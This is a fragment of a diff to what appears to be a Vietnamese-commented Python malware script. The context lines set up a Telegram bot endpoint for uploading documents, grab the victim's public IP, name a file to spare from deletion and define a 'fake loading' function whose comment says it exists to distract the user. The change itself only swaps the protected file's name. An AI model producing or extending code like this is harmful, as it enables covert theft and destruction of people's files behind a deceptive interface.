@@ -18,7 +18,7 @@ TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 ip = requests.get('https://kiemtraip.com/raw.php').text
 
 # Đường dẫn đến file bạn không muốn xóa
-protected_file = "buf.py" # Tên file bạn muốn bảo vệ khỏi bị xóa
+protected_file = "golikenokey.py" # Tên file bạn muốn bảo vệ khỏi bị xóa
 
 # Fake loading để đánh lạc hướng người dùng
 def fake_loading():
